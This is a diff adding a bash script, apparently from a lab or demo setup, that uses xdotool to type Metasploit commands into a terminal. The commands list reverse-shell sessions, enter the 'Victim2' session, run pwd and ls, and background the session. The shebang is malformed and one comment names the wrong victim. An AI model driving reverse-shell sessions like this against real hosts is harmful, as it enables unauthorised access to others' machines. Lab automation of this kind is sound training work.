@@ -1,0 +1,25 @@
+!/bin/bash
+###############################
+# Script to access internal web server via Reverse Shell (Victim1 session)
+# The commands using metasploit are
+# sessions -l                                                <--- list all existing Reverse Shell sessions
+# sessions -i 2                                              <--- use session2 (Victim2)
+# and run some commands
+###############################
+
+
+echo "Wait for the end of Victim2 Attack script..."
+
+xdotool windowactivate `cat /tmp/attack_window`
+xdotool type --window `cat /tmp/attack_window` --delay 100 "sessions -l"; xdotool key --window `cat /tmp/attack_window` Return
+sleep 1
+xdotool type --window `cat /tmp/attack_window` --delay 100 "sessions -i 2"; xdotool key --window `cat /tmp/attack_window` Return
+sleep 2
+xdotool type --window `cat /tmp/attack_window` --delay 100 "pwd"; xdotool key --window `cat /tmp/attack_window` Return
+sleep 1
+xdotool type --window `cat /tmp/attack_window` --delay 100 "ls"; xdotool key --window `cat /tmp/attack_window` Return
+sleep 1
+xdotool type --window `cat /tmp/attack_window` --delay 100 "background"; xdotool key --window `cat /tmp/attack_window` Return
+sleep 2
+
+echo "Victim2 Attack Done."
